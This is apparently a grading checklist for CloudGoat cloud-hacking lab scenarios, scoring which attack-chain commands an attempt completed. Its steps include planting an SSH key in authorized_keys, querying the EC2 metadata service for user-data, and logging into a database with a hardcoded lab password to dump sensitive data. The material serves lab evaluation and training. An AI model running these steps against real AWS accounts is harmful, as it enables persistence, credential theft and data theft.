# Relative path
## Lara A (5a)

- [x] aws configure --profile Lara
- [x] aws s3 cp s3://<bucket\>/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile Lara
- [x] echo "public ssh key" >> /home/ubuntu/.ssh/authorized_keys // Code execution step
- [x] aws s3 cp s3://<bucket\>/db.txt
- [x] ssh -i private_key ubuntu@public.ip.of.ec2
- [ ] psql postgresql://<db_user>:<db_password>@\<rds-instance>:5432/<db_name>
- [ ] select * from sensitive_information;

Steps: 7
Completed: 5

## Lara B (5b)
- [x] aws configure --profile Lara
- [x] aws s3 cp s3://<bucket\>/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile Lara
- [x] echo "public ssh key" >> /home/ubuntu/.ssh/authorized_keys // Code execution step
- [x] ssh -i private_key ubuntu@public.ip.of.ec2
- [ ] curl http://169.254.169.254/latest/user-data
- [ ] psql postgresql://<db_user>:<db_password>@\<rds-instance>:5432/<db_name>
- [ ] select * from sensitive_information;

Steps: 7
Completed: 4

## McDuck (5c)
- [x] aws configure --profile McDuck
- [x] aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat . --profile McDuck // Only one item reported
- [ ] aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat.pub . --profile McDuck
- [x] SSH into EC2 instance // Implicit
- [x] aws s3 cp s3://<bucket>/db.txt
- [ ] psql postgresql://cgadmin:Purplepwny2029@<rds-instance\>:5432/cloudgoat
- [ ] select * from sensitive_informatio

Steps: 7
Completed: 4

# Absolute path

## Lara A (5a)
- [x] aws configure --profile Lara
- [ ] aws s3 ls --profile Lara
- [ ] aws s3 ls s3://<bucket\> --recursive --profile Lara
- [x] aws s3 cp s3://<bucket\>/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile Lara
- [ ] cat 555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log
- [ ] aws elbv2 describe-load-balancers --profile Lara
- [x] echo "public ssh key" >> /home/ubuntu/.ssh/authorized_keys // Code execution step
- [ ] curl ifconfig.me
- [x] ssh -i private_key ubuntu@public.ip.of.ec2
- [ ] sudo apt-get install awscli
- [ ] aws s3 ls
- [ ] aws s3 ls s3://<bucket\> --recursive
- [x] aws s3 cp s3://<bucket\>/db.txt .
- [ ] cat db.txt
- [ ] aws rds describe-db-instances --region us-east-1
- [ ] psql postgresql://<db_user>:<db_password>@<rds-instance\>:5432/<db_name>
- [ ] \dt
- [ ] select * from sensitive_information;

Steps: 18
Completed: 5

## Lara B (5b)

- [x] aws configure --profile Lara
- [ ] aws s3 ls --profile Lara
- [ ] aws s3 ls s3://<bucket\> --recursive --profile Lara
- [x] aws s3 cp s3://<bucket\>/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile Lara
- [ ] cat 555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log
- [ ] aws elbv2 describe-load-balancers --profile Lara
- [x] echo "public ssh key" >> /home/ubuntu/.ssh/authorized_keys // Code execution step
- [ ] curl ifconfig.me
- [x] ssh -i private_key ubuntu@public.ip.of.ec2
- [ ] curl http://169.254.169.254/latest/user-data
- [ ] psql postgresql://<db_user>:<db_password>@<rds-instance\>:5432/<db_name>
- [ ] \dt // Inferred
- [ ] select * from sensitive_information; // Inferred

Steps: 13
Completed: 4

## McDuck (5c)

- [x] aws configure --profile McDuck
- [ ] aws s3 ls --profile McDuck
- [ ] aws s3 ls s3://<bucketz> --recursive --profile McDuck
- [x] aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat . --profile McDuck // Only one item reported
- [ ] aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat.pub . --profile McDuck
- [ ] aws ec2 describe-instances --profile McDuck
- [ ] chmod 400 cloudgoat
- [x] (Access EC2 via SSH) // Implicit
- [ ] sudo apt-get install awscli
- [ ] aws s3 ls
- [ ] aws s3 ls s3://<bucket\> --recursive
- [x] aws s3 cp s3://<bucket\>/db.txt .
- [ ] cat db.txt
- [ ] aws rds describe-db-instances --region us-east-1
- [ ] psql postgresql://cgadmin:Purplepwny2029@<rds-instance\>:5432/cloudgoat
- [ ] \dt
- [ ] select * from sensitive_information;


Steps: 17
Completed: 4
